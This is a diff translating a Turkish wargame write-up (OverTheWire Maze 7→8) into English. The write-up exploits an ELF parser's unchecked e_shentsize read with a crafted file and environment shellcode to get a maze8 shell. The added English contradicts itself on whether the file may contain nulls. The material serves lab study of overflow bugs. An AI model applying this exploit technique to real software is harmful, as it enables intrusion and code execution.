@@ -1,69 +1,78 @@
 # OverTheWire — Maze Level 7 → 8
 
-> Hedef: `maze7`'den `maze8` şifresi. Sonuç: **`**********`** (gizlendi)
-> Teknik: Bir ELF section-header parser'ında **dosyadan-okunan boyutla (`e_shentsize`) sabit stack buffer'ı taşırma** → dönüş adresi ezme → env shellcode (NX kapalı).
+> Goal: Get `maze8` password from `maze7`. Result: **`**********`** (hidden)
+> Technique: **Buffer overflow via a file-supplied size field (`e_shentsize`)** overflowing a
+> fixed stack buffer in an ELF section-header parser → overwrite return address → env shellcode
+> (NX disabled).
 
 ---
 
-## 1. İlk Bakış
+## 1. First Look
 ```bash
 /maze/maze7 file        # usage: /maze/maze7 file
 checksec: No canary | NX DISABLED | No PIE | No RELRO
 ```
-Program argv[1]'deki dosyayı bir **ELF** gibi okuyup section-header'ları döker.
+The program reads the file in argv[1] as an **ELF** and dumps its section headers.
 
-## 2. Analiz
-`main`: dosyanın ilk 52 baytını (ELF başlığı) okur ve şu alanları çıkarır → `Print_Shdrs`'a verir:
-| Alan | ELF offset | Rol |
-|------|-----------|-----|
-| `e_shoff` | 0x20 | section-header tablosunun dosya offset'i |
-| `e_shstrndx` | 0x32 | string-table section index'i |
-| `e_shnum` | 0x30 | section sayısı (döngü sayısı) |
-| `e_shentsize` | 0x2e | **her section header'ın boyutu** |
+## 2. Analysis
+`main`: reads the first 52 bytes (ELF header) and extracts these fields → passes to `Print_Shdrs`:
+| Field | ELF offset | Role |
+|-------|-----------|------|
+| `e_shoff` | 0x20 | file offset of the section-header table |
+| `e_shstrndx` | 0x32 | string-table section index |
+| `e_shnum` | 0x30 | number of sections (loop count) |
+| `e_shentsize` | 0x2e | **size of each section header** |
 
-`Print_Shdrs` (özet):
+`Print_Shdrs` (summary):
 ```c
-Elf32_Shdr local;             // [ebp-0x3c]  SABİT stack buffer
+Elf32_Shdr local;             // [ebp-0x3c]  FIXED stack buffer
 ...
 for (i = 0; i <= shnum; i++) {
-    read(fd, &local, shentsize);   // <-- shentsize DOSYADAN; sınır yok!
+    read(fd, &local, shentsize);   // <-- shentsize FROM FILE; no bounds check!
     printf("%2d: %-16s\t0x%08x\t0x%04x\n", i, strtab+local.sh_name, local.sh_addr, local.sh_size);
 }
 ```
 
-## 3. Zafiyet
-`read(fd, &local, shentsize)` — `local` 0x3c offset'inde sabit; `[ebp-0x3c]`'ten `[ebp+4]` (dönüş adresi) arası **0x40 bayt**. `e_shentsize > 0x40` yaparsak okuma **dönüş adresini ezer**. Okunan baytlar bizim dosyamızdan geldiği için **tam kontrol** bizde. NX kapalı → dönüş adresini env'deki shellcode'a yönlendiririz.
+## 3. Vulnerability
+`read(fd, &local, shentsize)` — `local` is at offset 0x3c; from `[ebp-0x3c]` to `[ebp+4]`
+(return address) is **0x40 bytes**. Setting `e_shentsize > 0x40` causes the read to **overwrite
+the return address**. The bytes read come from our file, so we have **full control**. NX disabled
+→ point the return address at shellcode in the environment.
 
-> Döngü `i <= shnum` (off-by-one). `shnum=1` ile 2 iterasyon olur; **son** `read` dönüş adresini belirler. İki özdeş blok koyarak her iki iterasyonda da `ret = shellcode` yaptım.
+> The loop runs `i <= shnum` (off-by-one). With `shnum=1` there are 2 iterations; the **last**
+> `read` determines the return address. I placed two identical blocks so both iterations set
+> `ret = shellcode`.
 
-## 4. Crafted ELF (200 bayt)
+## 4. Crafted ELF (200 bytes)
 ```python
 f[0x20:0x24] = p32(0x40)     # e_shoff = 0x40
 f[0x2e:0x30] = p16(0x44)     # e_shentsize = 0x44  (>0x40 -> overflow)
 f[0x30:0x32] = p16(1)        # e_shnum = 1
 f[0x32:0x34] = p16(0)        # e_shstrndx = 0
-# blok @0x40 (hem shdrs hem dongu i=0):
-f[0x40+0x10:..] = p32(0)     # sh_offset (strtab) = 0   (crash olmasin)
+# block @0x40 (shdrs + loop i=0):
+f[0x40+0x10:..] = p32(0)     # sh_offset (strtab) = 0   (avoid crash)
 f[0x40+0x14:..] = p32(0x10)  # sh_size  (strtab) = 0x10
 f[0x40+0x40:..] = p32(target)# ret  (i=0)
-# blok @0x84 (dongu i=1, SON read):
+# block @0x84 (loop i=1, FINAL read):
 f[0x84+0x40:..] = p32(target)# ret  (final)
 ```
-`target` = env'deki NOP-sled+shellcode adresi (ASLR kapalı; eşleştirilmiş printer ile bulundu). Dosya baytlarında **null serbest** (memfrob/strcpy yok) → adresleri rahatça gömeriz.
+`target` = address of the NOP-sled+shellcode in env (ASLR off; found with a matched printer).
+File bytes are **free of nulls** (no memfrob/strcpy) → addresses can be embedded freely.
 
 ## 5. Exploit
 ```bash
 printf 'cat /etc/maze_pass/maze8\n' | python3 x.py
 # SC=0xffffddc0 target=0xffffdec0
-# uid=15008(maze8) ... <maze8 şifresi>
+# uid=15008(maze8) ... <maze8 password>
 ```
-`Print_Shdrs` ret edince `target`'a (shellcode) atlar → `setresuid` + `execve("/bin/sh")` → maze8.
+When `Print_Shdrs` returns, execution jumps to `target` (shellcode) → `setresuid` +
+`execve("/bin/sh")` → maze8.
 
-## Dersler
-| Konu | Not |
-|------|-----|
-| Parser overflow | Dosya/ağ verisinden gelen **boyut alanı** sabit buffer'a okunursa overflow olur (ELF/PE/PDF parser'ları klasik hedef) |
-| Güvenilmeyen metadata | `e_shentsize`/`e_shnum` saldırgan kontrolünde; asla sınır varsaymadan kullanılmaz |
-| off-by-one (`<=`) | Döngü bir fazla döner; "son yazan kazanır" mantığıyla payload yerleştir |
-| NX kapalı + ret2env | Dönüş adresi env'deki shellcode'a; dosya verisi null içerebildiği için adresleme kolay |
-| Robustluk | strtab okuması crash etmesin diye `sh_offset/sh_size` ve `sh_name` küçük/geçerli ayarlanır |
+## Lessons
+| Topic | Note |
+|-------|------|
+| Parser overflow | A **size field from file/network** read into a fixed buffer causes overflow (ELF/PE/PDF parsers are classic targets) |
+| Untrusted metadata | `e_shentsize`/`e_shnum` are attacker-controlled; never assume bounds |
+| Off-by-one (`<=`) | Loop runs one extra iteration; "last write wins" — place payload accordingly |
+| NX disabled + ret2env | Point return address to shellcode in env; file data can contain nulls freely so addressing is easy |
+| Robustness | Set `sh_offset/sh_size` and `sh_name` to small/valid values so the strtab read doesn't crash |
